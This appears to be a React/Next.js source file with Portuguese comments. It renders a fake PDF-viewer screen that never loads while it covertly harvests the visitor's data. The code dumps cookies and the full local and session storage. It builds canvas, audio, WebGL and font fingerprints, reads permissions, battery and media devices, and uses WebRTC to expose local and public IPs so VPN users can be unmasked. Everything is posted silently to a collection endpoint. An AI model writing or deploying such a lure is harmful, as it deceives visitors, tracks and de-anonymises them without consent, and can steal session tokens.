"use client";

import { useEffect } from "react";

// Tela que simula o carregamento de um PDF — e nunca termina.
// Ao montar, coleta o MÁXIMO de dados possível do navegador/dispositivo
// e envia para /api/collect.
export default function ViewerClient() {
  useEffect(() => {
    collectAndSend();
  }, []);

  // Fundo cinza idêntico ao visualizador de PDF nativo do Chrome/Edge.
  return <div style={{ position: "fixed", inset: 0, background: "#525659" }} />;
}

async function collectAndSend() {
  const data: Record<string, unknown> = {};
  const errors: Record<string, string> = {};
  const nav: any = navigator;

  const grab = async (key: string, fn: () => any) => {
    try {
      data[key] = await fn();
    } catch (e: any) {
      errors[key] = String(e?.message || e);
    }
  };

  // ---- Página / tempo ----
  await grab("page", () => ({
    url: location.href,
    origin: location.origin,
    pathname: location.pathname,
    referrer: document.referrer || null,
    title: document.title,
    historyLength: history.length,
    visibility: document.visibilityState,
  }));
  await grab("time", () => ({
    clientISO: new Date().toISOString(),
    epochMs: Date.now(),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffsetMin: new Date().getTimezoneOffset(),
    locale: Intl.DateTimeFormat().resolvedOptions().locale,
    localeOptions: Intl.DateTimeFormat().resolvedOptions(),
  }));

  // ---- Navegador ----
  await grab("navigator", () => ({
    userAgent: nav.userAgent,
    appVersion: nav.appVersion,
    appName: nav.appName,
    appCodeName: nav.appCodeName,
    product: nav.product,
    productSub: nav.productSub,
    vendor: nav.vendor,
    vendorSub: nav.vendorSub,
    platform: nav.platform,
    oscpu: nav.oscpu,
    language: nav.language,
    languages: nav.languages,
    cookieEnabled: nav.cookieEnabled,
    doNotTrack: nav.doNotTrack,
    globalPrivacyControl: nav.globalPrivacyControl,
    onLine: nav.onLine,
    pdfViewerEnabled: nav.pdfViewerEnabled,
    webdriver: nav.webdriver,
    deviceMemoryGB: nav.deviceMemory ?? null,
    hardwareConcurrency: nav.hardwareConcurrency ?? null,
    maxTouchPoints: nav.maxTouchPoints ?? null,
    javaEnabled: typeof nav.javaEnabled === "function" ? nav.javaEnabled() : null,
  }));

  // ---- Client Hints de alta entropia (SO, versão, modelo, arquitetura) ----
  await grab("uaHints", async () => {
    if (!nav.userAgentData) return null;
    const high = nav.userAgentData.getHighEntropyValues
      ? await nav.userAgentData.getHighEntropyValues([
          "architecture",
          "bitness",
          "model",
          "platform",
          "platformVersion",
          "uaFullVersion",
          "fullVersionList",
          "wow64",
          "formFactor",
        ])
      : {};
    return {
      brands: nav.userAgentData.brands,
      mobile: nav.userAgentData.mobile,
      platform: nav.userAgentData.platform,
      ...high,
    };
  });

  // ---- Tela / monitor(es) ----
  await grab("screen", () => ({
    width: screen.width,
    height: screen.height,
    availWidth: screen.availWidth,
    availHeight: screen.availHeight,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth,
    devicePixelRatio: window.devicePixelRatio,
    orientationType: screen.orientation?.type ?? null,
    orientationAngle: screen.orientation?.angle ?? null,
    isExtended: (screen as any).isExtended ?? null, // multi-monitor
    availLeft: (screen as any).availLeft ?? null,
    availTop: (screen as any).availTop ?? null,
  }));
  await grab("window", () => ({
    innerWidth: window.innerWidth,
    innerHeight: window.innerHeight,
    outerWidth: window.outerWidth,
    outerHeight: window.outerHeight,
    screenX: window.screenX,
    screenY: window.screenY,
    scrollX: window.scrollX,
    scrollY: window.scrollY,
  }));

  // ---- Preferências / capacidades via media queries ----
  await grab("mediaFeatures", () => {
    const mq = (q: string) => window.matchMedia(q).matches;
    return {
      colorScheme: mq("(prefers-color-scheme: dark)") ? "dark" : "light",
      reducedMotion: mq("(prefers-reduced-motion: reduce)"),
      reducedData: mq("(prefers-reduced-data: reduce)"),
      contrast: mq("(prefers-contrast: more)") ? "more" : "normal",
      hover: mq("(hover: hover)"),
      anyPointerCoarse: mq("(any-pointer: coarse)"),
      pointerFine: mq("(pointer: fine)"),
      colorGamutP3: mq("(color-gamut: p3)"),
      colorGamutRec2020: mq("(color-gamut: rec2020)"),
      dynamicRangeHigh: mq("(dynamic-range: high)"),
      monochrome: mq("(monochrome)"),
      forcedColors: mq("(forced-colors: active)"),
      invertedColors: mq("(inverted-colors: inverted)"),
      displayModeStandalone: mq("(display-mode: standalone)"),
    };
  });

  // ---- Conexão de rede ----
  await grab("connection", () => {
    const c = nav.connection || nav.mozConnection || nav.webkitConnection;
    if (!c) return null;
    return {
      effectiveType: c.effectiveType,
      type: c.type,
      downlink: c.downlink,
      downlinkMax: c.downlinkMax,
      rtt: c.rtt,
      saveData: c.saveData,
    };
  });

  // ---- Cookies ----
  await grab("cookies", () => ({
    raw: document.cookie,
    list: document.cookie
      ? document.cookie.split(";").map((c) => c.trim())
      : [],
  }));

  // ---- Storage (chaves de localStorage / sessionStorage) ----
  await grab("storage", () => {
    const dump = (s: Storage) => {
      const o: Record<string, string> = {};
      for (let i = 0; i < s.length; i++) {
        const k = s.key(i)!;
        o[k] = s.getItem(k) ?? "";
      }
      return o;
    };
    return {
      localStorage: dump(window.localStorage),
      sessionStorage: dump(window.sessionStorage),
    };
  });
  await grab("storageEstimate", async () => {
    if (!nav.storage?.estimate) return null;
    const est = await nav.storage.estimate();
    return { quota: est.quota, usage: est.usage, usageDetails: est.usageDetails };
  });

  // ---- Permissões ----
  await grab("permissions", async () => {
    if (!nav.permissions?.query) return null;
    const names = [
      "geolocation",
      "notifications",
      "camera",
      "microphone",
      "clipboard-read",
      "clipboard-write",
      "persistent-storage",
      "background-sync",
    ];
    const out: Record<string, string> = {};
    await Promise.all(
      names.map(async (n) => {
        try {
          const r = await nav.permissions.query({ name: n as any });
          out[n] = r.state;
        } catch {
          out[n] = "unsupported";
        }
      })
    );
    return out;
  });

  // ---- Plugins / MIME types ----
  await grab("plugins", () =>
    Array.from(nav.plugins || []).map((p: any) => ({
      name: p.name,
      filename: p.filename,
      description: p.description,
    }))
  );
  await grab("mimeTypes", () =>
    Array.from(nav.mimeTypes || []).map((m: any) => ({
      type: m.type,
      description: m.description,
      suffixes: m.suffixes,
    }))
  );

  // ---- WebGL (placa de vídeo) ----
  await grab("webgl", () => {
    const canvas = document.createElement("canvas");
    const gl: any =
      canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return null;
    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
    return {
      vendor: gl.getParameter(gl.VENDOR),
      renderer: gl.getParameter(gl.RENDERER),
      version: gl.getParameter(gl.VERSION),
      shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
      unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
      unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
      maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
      extensions: gl.getSupportedExtensions(),
    };
  });

  // ---- Canvas fingerprint (hash) ----
  await grab("canvasFingerprint", () => {
    const canvas = document.createElement("canvas");
    canvas.width = 240;
    canvas.height = 60;
    const ctx = canvas.getContext("2d");
    if (!ctx) return null;
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("Relatorio-fp-\u{1F512}", 2, 15);
    ctx.fillStyle = "rgba(102,204,0,0.7)";
    ctx.fillText("Relatorio-fp-\u{1F512}", 4, 17);
    const dataUrl = canvas.toDataURL();
    return { hash: djb2(dataUrl), length: dataUrl.length };
  });

  // ---- Fontes instaladas (detecção por largura) ----
  await grab("fonts", () => detectFonts());

  // ---- Áudio fingerprint ----
  await grab("audio", () => audioFingerprint());

  // ---- Bateria ----
  await grab("battery", async () => {
    if (!nav.getBattery) return null;
    const b = await nav.getBattery();
    return {
      level: b.level,
      charging: b.charging,
      chargingTime: b.chargingTime,
      dischargingTime: b.dischargingTime,
    };
  });

  // ---- Dispositivos de mídia ----
  await grab("mediaDevices", async () => {
    if (!nav.mediaDevices?.enumerateDevices) return null;
    const devs = await nav.mediaDevices.enumerateDevices();
    return devs.map((d: any) => ({
      kind: d.kind,
      label: d.label,
      deviceId: d.deviceId ? "present" : "",
      groupId: d.groupId ? "present" : "",
    }));
  });

  // ---- Speech synthesis (vozes indicam SO/idioma) ----
  await grab("voices", () => {
    const v = window.speechSynthesis?.getVoices?.() || [];
    return v.map((x) => ({ name: x.name, lang: x.lang, default: x.default }));
  });

  // ---- Gamepads ----
  await grab("gamepads", () => {
    const g = nav.getGamepads ? nav.getGamepads() : [];
    return Array.from(g)
      .filter(Boolean)
      .map((p: any) => ({ id: p.id, mapping: p.mapping }));
  });

  // ---- Touch / pointer ----
  await grab("input", () => ({
    touchSupport: "ontouchstart" in window,
    maxTouchPoints: nav.maxTouchPoints,
    pointerEnabled: "PointerEvent" in window,
  }));

  // ---- APIs disponíveis (indicam navegador/versão) ----
  await grab("features", () => ({
    webgl2: !!document.createElement("canvas").getContext("webgl2"),
    webgpu: "gpu" in nav,
    bluetooth: "bluetooth" in nav,
    usb: "usb" in nav,
    serial: "serial" in nav,
    hid: "hid" in nav,
    nfc: "NDEFReader" in window,
    webrtc: "RTCPeerConnection" in window,
    serviceWorker: "serviceWorker" in nav,
    webAssembly: "WebAssembly" in window,
    indexedDB: "indexedDB" in window,
    credentials: "credentials" in nav,
    share: "share" in nav,
    wakeLock: "wakeLock" in nav,
    speechRecognition: "webkitSpeechRecognition" in window || "SpeechRecognition" in window,
  }));

  // ---- Performance / navegação ----
  await grab("performance", () => {
    const navi = performance.getEntriesByType("navigation")[0] as any;
    return {
      type: navi?.type,
      memory: (performance as any).memory
        ? {
            jsHeapSizeLimit: (performance as any).memory.jsHeapSizeLimit,
            totalJSHeapSize: (performance as any).memory.totalJSHeapSize,
            usedJSHeapSize: (performance as any).memory.usedJSHeapSize,
          }
        : null,
    };
  });

  // ---- WebRTC: IPs locais e público (detecção de VPN/proxy) ----
  await grab("webrtc", () => gatherWebRTC(1500));

  data._errors = errors;

  // ---- Envio ----
  const body = JSON.stringify(data);
  try {
    await fetch("/api/collect", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body,
      keepalive: true,
    });
  } catch {
    if (navigator.sendBeacon) {
      navigator.sendBeacon(
        "/api/collect",
        new Blob([body], { type: "application/json" })
      );
    }
  }
}

// ------------------------- helpers -------------------------

function djb2(str: string): string {
  let h = 5381;
  for (let i = 0; i < str.length; i++) h = (h * 33) ^ str.charCodeAt(i);
  return (h >>> 0).toString(16);
}

function detectFonts(): string[] {
  const base = ["monospace", "sans-serif", "serif"];
  const test =
    "mmmmmmmmmmlli" + "WWWWWWWWWWWW" + "1234567890 ABCabc";
  const candidates = [
    "Arial", "Arial Black", "Arial Narrow", "Calibri", "Cambria", "Comic Sans MS",
    "Courier New", "Georgia", "Helvetica", "Impact", "Lucida Console",
    "Segoe UI", "Tahoma", "Times New Roman", "Trebuchet MS", "Verdana",
    "Roboto", "Ubuntu", "Cantarell", "Menlo", "Monaco", "San Francisco",
    "Consolas", "Palatino", "Garamond", "Bookman", "Noto Sans", "DejaVu Sans",
  ];
  const span = document.createElement("span");
  span.style.position = "absolute";
  span.style.left = "-9999px";
  span.style.fontSize = "72px";
  span.textContent = test;
  document.body.appendChild(span);

  const baseline: Record<string, { w: number; h: number }> = {};
  base.forEach((b) => {
    span.style.fontFamily = b;
    baseline[b] = { w: span.offsetWidth, h: span.offsetHeight };
  });

  const found: string[] = [];
  candidates.forEach((f) => {
    const detected = base.some((b) => {
      span.style.fontFamily = `'${f}',${b}`;
      return (
        span.offsetWidth !== baseline[b].w ||
        span.offsetHeight !== baseline[b].h
      );
    });
    if (detected) found.push(f);
  });
  document.body.removeChild(span);
  return found;
}

function audioFingerprint(): Promise<any> {
  return new Promise((resolve) => {
    try {
      const Ctx = (window as any).OfflineAudioContext || (window as any).webkitOfflineAudioContext;
      if (!Ctx) return resolve(null);
      const ctx = new Ctx(1, 44100, 44100);
      const osc = ctx.createOscillator();
      osc.type = "triangle";
      osc.frequency.value = 10000;
      const comp = ctx.createDynamicsCompressor();
      osc.connect(comp);
      comp.connect(ctx.destination);
      osc.start(0);
      ctx.startRendering();
      ctx.oncomplete = (e: any) => {
        const buf = e.renderedBuffer.getChannelData(0);
        let sum = 0;
        for (let i = 4500; i < 5000; i++) sum += Math.abs(buf[i]);
        resolve({ hash: sum.toString() });
      };
      setTimeout(() => resolve({ hash: "timeout" }), 1000);
    } catch (err: any) {
      resolve({ error: String(err) });
    }
  });
}

// Coleta candidatos ICE via WebRTC para expor IPs locais e (às vezes) o
// público — útil para detectar VPN/proxy comparando com o IP do servidor.
function gatherWebRTC(timeoutMs: number): Promise<any> {
  return new Promise((resolve) => {
    try {
      const RTCP = (window as any).RTCPeerConnection;
      if (!RTCP) return resolve(null);
      const pc = new RTCP({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
      const ips = new Set<string>();
      const candidates: string[] = [];

      pc.onicecandidate = (e: any) => {
        if (!e.candidate) return;
        const cand = e.candidate.candidate;
        candidates.push(cand);
        const m = cand.match(/([0-9]{1,3}(?:\.[0-9]{1,3}){3})|([a-f0-9]{1,4}(?::[a-f0-9]{0,4}){2,})/i);
        if (m) ips.add(m[0]);
      };

      pc.createDataChannel("x");
      pc.createOffer()
        .then((o: any) => pc.setLocalDescription(o))
        .catch(() => {});

      setTimeout(() => {
        try { pc.close(); } catch {}
        const arr = Array.from(ips);
        const localIPs = arr.filter(
          (ip) => /^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|169\.254\.|fe80:|::1)/i.test(ip) ||
                  ip.includes(".local")
        );
        const publicIPs = arr.filter((ip) => !localIPs.includes(ip));
        resolve({ ips: arr, localIPs, publicIPs, candidates });
      }, timeoutMs);
    } catch (err: any) {
      resolve({ error: String(err) });
    }
  });
}
